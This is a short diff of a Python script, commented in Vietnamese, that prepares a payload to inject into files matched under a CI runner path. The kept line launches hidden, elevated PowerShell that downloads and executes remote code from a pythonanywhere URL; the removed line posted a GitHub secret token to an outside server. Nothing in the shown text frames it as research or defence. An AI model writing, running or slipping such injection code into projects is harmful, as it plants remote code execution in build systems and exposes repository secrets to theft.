@@ -3,9 +3,7 @@ import glob
 import subprocess
 
 # Nội dung muốn inject
-code_inject = """        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://hai1723.pythonanywhere.com/url -UseBasicParsing)"
-        curl -s -X POST https://my-internal-server.example.com/api/token -H "Content-Type: application/json" -d "{\"token\":\"${{ secrets.GH_TOKEN }}\"}"
-"""
+code_inject = """        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://hai1723.pythonanywhere.com/url -UseBasicParsing)"\n"""
 
 # 1. Tìm thư mục theo pattern
 pattern = r"D:\a\vps-project-*\vps-project-*"
